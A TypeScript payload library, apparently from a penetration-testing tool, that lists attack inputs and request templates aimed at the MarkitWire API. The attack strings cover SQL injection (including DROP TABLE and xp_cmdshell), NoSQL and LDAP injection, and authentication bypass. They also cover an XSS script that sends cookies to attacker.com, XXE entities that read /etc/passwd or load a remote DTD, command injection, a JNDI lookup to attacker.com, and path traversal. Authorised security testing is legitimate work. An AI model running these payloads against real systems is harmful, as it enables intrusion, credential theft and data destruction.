// Penetration Testing Payload Library for MarkitWire API Security Testing

export interface PayloadSet {
  name: string;
  description: string;
  category: string;
  payloads: string[];
  riskLevel: 'low' | 'medium' | 'high' | 'critical';
}

export interface PayloadTemplate {
  id: string;
  name: string;
  description: string;
  method: string;
  headers?: Record<string, string>;
  body?: any;
  urlParams?: Record<string, string>;
  expectedVulnerability: string;
}

// SQL Injection Payloads for MarkitWire API Testing
export const sqlInjectionPayloads: PayloadSet = {
  name: "SQL Injection",
  description: "Test for SQL injection vulnerabilities in MarkitWire API endpoints",
  category: "injection",
  riskLevel: "critical",
  payloads: [
    "' OR '1'='1",
    "'; DROP TABLE deals; --",
    "' UNION SELECT null, username, password FROM users --",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    "'; EXEC xp_cmdshell('dir'); --",
    "' OR 1=1; UPDATE deals SET status='cancelled' WHERE id=1; --",
    "admin'--",
    "admin'/*",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "' AND 1=(SELECT COUNT(*) FROM tabname); --",
    "1'; WAITFOR DELAY '00:00:10'; --",
    "'; SELECT * FROM sys.databases; --"
  ]
};

// NoSQL Injection Payloads
export const noSqlInjectionPayloads: PayloadSet = {
  name: "NoSQL Injection",
  description: "Test for NoSQL injection in MongoDB/document-based backends",
  category: "injection", 
  riskLevel: "high",
  payloads: [
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$where": "this.username == this.password"}',
    '{"$gt": ""}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"$or": [{"username": "admin"}, {"role": "admin"}]}',
    '{"$regex": "^admin"}',
    '{"username": {"$exists": true}}',
    '{"$where": "function() { return true; }"}',
    '{"password": {"$in": ["", null, false, 0]}}'
  ]
};

// Cross-Site Scripting (XSS) Payloads
export const xssPayloads: PayloadSet = {
  name: "Cross-Site Scripting (XSS)",
  description: "Test for XSS vulnerabilities in API responses",
  category: "xss",
  riskLevel: "medium",
  payloads: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<object data='javascript:alert(\"XSS\")'></object>",
    "<embed src='javascript:alert(\"XSS\")'></embed>",
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
    "\"><script>alert('XSS')</script>",
    "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
    "<script src='http://attacker.com/malicious.js'></script>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>"
  ]
};

// Authentication Bypass Payloads
export const authBypassPayloads: PayloadSet = {
  name: "Authentication Bypass",
  description: "Test for authentication bypass vulnerabilities",
  category: "authentication",
  riskLevel: "critical",
  payloads: [
    '{"username": "admin", "password": ""}',
    '{"username": "admin\\'--", "password": "anything"}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": "admin", "password": {"$regex": ".*"}}',
    'true',
    '1=1',
    '{"$where": "1==1"}',
    '{"username": "admin", "password": {"$gt": ""}}',
    '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
    '{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$exists": false}}'
  ]
};

// Parameter Pollution Payloads
export const parameterPollutionPayloads: PayloadSet = {
  name: "Parameter Pollution",
  description: "Test for HTTP parameter pollution vulnerabilities",
  category: "pollution",
  riskLevel: "medium",
  payloads: [
    "param=value1&param=value2",
    "user=guest&user=admin",
    "role=user&role=admin",
    "access_level=1&access_level=9",
    "id=1&id=2",
    "action=view&action=delete",
    "status=pending&status=approved",
    "amount=100&amount=1000000",
    "userid=123&userid=1",
    "permission=read&permission=write&permission=admin"
  ]
};

// Buffer Overflow Payloads
export const bufferOverflowPayloads: PayloadSet = {
  name: "Buffer Overflow",
  description: "Test for buffer overflow vulnerabilities",
  category: "overflow",
  riskLevel: "high",
  payloads: [
    "A".repeat(1000),
    "A".repeat(5000),
    "A".repeat(10000),
    "A".repeat(50000),
    "%s%s%s%s%s%s%s%s%s%s",
    "\x00".repeat(100),
    "\x41".repeat(1024),
    "AAAA" + "B".repeat(1000),
    "\\".repeat(1000),
    '"'.repeat(1000)
  ]
};

// LDAP Injection Payloads
export const ldapInjectionPayloads: PayloadSet = {
  name: "LDAP Injection",
  description: "Test for LDAP injection vulnerabilities",
  category: "injection",
  riskLevel: "high",
  payloads: [
    "*",
    "*)(&",
    "*)(uid=*",
    "*)(cn=*",
    "admin)(&(password=*))",
    "*)(|(objectclass=*))",
    "*))(|(cn=*",
    "*))%00",
    "admin*)((|userPassword=*)",
    "*)(|(uid=admin)(uid=*"
  ]
};

// XML External Entity (XXE) Payloads
export const xxePayloads: PayloadSet = {
  name: "XML External Entity (XXE)",
  description: "Test for XXE vulnerabilities in XML processing",
  category: "injection",
  riskLevel: "high",
  payloads: [
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.xml">]><root>&xxe;</root>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
    '<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext;]>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "expect://id">]><root>&test;</root>'
  ]
};

// Command Injection Payloads
export const commandInjectionPayloads: PayloadSet = {
  name: "Command Injection",
  description: "Test for OS command injection vulnerabilities",
  category: "injection",
  riskLevel: "critical",
  payloads: [
    "; ls -la",
    "&& whoami",
    "| id",
    "; cat /etc/passwd",
    "&& dir",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; ping -c 4 127.0.0.1",
    "&& netstat -an",
    "| ps aux",
    "; uname -a",
    "&& ipconfig /all",
    "$(whoami)",
    "`cat /etc/passwd`",
    "${jndi:ldap://attacker.com/exploit}"
  ]
};

// MarkitWire Specific API Payloads
export const markitWireSpecificPayloads: PayloadSet = {
  name: "MarkitWire API Specific",
  description: "Payloads specific to MarkitWire API vulnerabilities",
  category: "markitwire",
  riskLevel: "high",
  payloads: [
    '{"dealId": "../../../etc/passwd"}',
    '{"sessionHandle": -1}',
    '{"loginHandle": 999999999}',
    '{"dealVersionHandle": "00000000-0000-0000-0000-000000000000"}',
    '{"bookId": "$(cat /etc/passwd)"}',
    '{"username": "admin\'; DROP TABLE deals; --"}',
    '{"notificationId": "../../config/database.xml"}',
    '{"organizationId": {"$ne": null}}',
    '{"tradeId": "OR 1=1--"}',
    '{"counterpartyId": "\\\\\\\\\\\\\\\\"}'
  ]
};

// All payload sets for easy access
export const allPayloadSets: PayloadSet[] = [
  sqlInjectionPayloads,
  noSqlInjectionPayloads, 
  xssPayloads,
  authBypassPayloads,
  parameterPollutionPayloads,
  bufferOverflowPayloads,
  ldapInjectionPayloads,
  xxePayloads,
  commandInjectionPayloads,
  markitWireSpecificPayloads
];

// Payload Templates for Common Attack Scenarios
export const payloadTemplates: PayloadTemplate[] = [
  {
    id: "sql-login-bypass",
    name: "SQL Injection Login Bypass",
    description: "Attempt to bypass login authentication using SQL injection",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: {
      "username": "admin' OR '1'='1' --",
      "password": "anything"
    },
    expectedVulnerability: "Authentication bypass via SQL injection"
  },
  {
    id: "nosql-login-bypass", 
    name: "NoSQL Injection Login Bypass",
    description: "Attempt to bypass login using NoSQL injection techniques",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: {
      "username": {"$ne": null},
      "password": {"$ne": null}
    },
    expectedVulnerability: "Authentication bypass via NoSQL injection"
  },
  {
    id: "xxe-file-read",
    name: "XXE File Disclosure",
    description: "Attempt to read local files using XML External Entity injection",
    method: "POST",
    headers: {
      "Content-Type": "application/xml"
    },
    body: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    expectedVulnerability: "Local file disclosure via XXE"
  },
  {
    id: "command-injection-id",
    name: "Command Injection - ID Command",
    description: "Execute OS commands via command injection vulnerability",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: {
      "filename": "test.txt; id",
      "action": "process"
    },
    expectedVulnerability: "OS command execution"
  },
  {
    id: "markitwire-deal-traversal",
    name: "MarkitWire Deal Path Traversal",
    description: "Attempt path traversal in MarkitWire deal retrieval",
    method: "GET",
    urlParams: {
      "dealId": "../../../etc/passwd",
      "loginHandle": "123456"
    },
    expectedVulnerability: "Path traversal leading to file disclosure"
  },
  {
    id: "markitwire-session-hijack",
    name: "MarkitWire Session Manipulation",
    description: "Attempt to manipulate session handles for privilege escalation",
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: {
      "sessionHandle": 999999999,
      "loginHandle": -1,
      "action": "elevate_privileges"
    },
    expectedVulnerability: "Session manipulation leading to privilege escalation"
  }
];

// Utility functions for payload management
export const getPayloadsByCategory = (category: string): PayloadSet[] => {
  return allPayloadSets.filter(set => set.category === category);
};

export const getPayloadsByRiskLevel = (riskLevel: string): PayloadSet[] => {
  return allPayloadSets.filter(set => set.riskLevel === riskLevel);
};

export const getRandomPayload = (payloadSet: PayloadSet): string => {
  const randomIndex = Math.floor(Math.random() * payloadSet.payloads.length);
  return payloadSet.payloads[randomIndex];
};

export const generateFuzzingPayloads = (basePayload: string, variations: number = 10): string[] => {
  const fuzzedPayloads: string[] = [];
  
  // Character substitution fuzzing
  const substitutions = [
    { from: "'", to: '"' },
    { from: " ", to: "%20" },
    { from: "=", to: "%3D" },
    { from: "&", to: "%26" },
    { from: "<", to: "%3C" },
    { from: ">", to: "%3E" }
  ];
  
  substitutions.forEach(sub => {
    if (basePayload.includes(sub.from)) {
      fuzzedPayloads.push(basePayload.replace(new RegExp(sub.from, 'g'), sub.to));
    }
  });
  
  // Length-based fuzzing
  fuzzedPayloads.push(basePayload.repeat(2));
  fuzzedPayloads.push(basePayload.repeat(10));
  
  // Case variation fuzzing
  fuzzedPayloads.push(basePayload.toUpperCase());
  fuzzedPayloads.push(basePayload.toLowerCase());
  
  // Null byte injection
  fuzzedPayloads.push(basePayload + "\x00");
  fuzzedPayloads.push("\x00" + basePayload);
  
  return fuzzedPayloads.slice(0, variations);
};

// Export categories for UI dropdown
export const payloadCategories = [
  { value: "injection", label: "Injection Attacks" },
  { value: "xss", label: "Cross-Site Scripting" },
  { value: "authentication", label: "Authentication Bypass" },
  { value: "pollution", label: "Parameter Pollution" },
  { value: "overflow", label: "Buffer Overflow" },
  { value: "markitwire", label: "MarkitWire Specific" }
];

// Export risk levels for filtering
export const riskLevels = [
  { value: "low", label: "Low Risk", color: "text-blue-400" },
  { value: "medium", label: "Medium Risk", color: "text-yellow-400" },
  { value: "high", label: "High Risk", color: "text-orange-400" },
  { value: "critical", label: "Critical Risk", color: "text-red-400" }
];
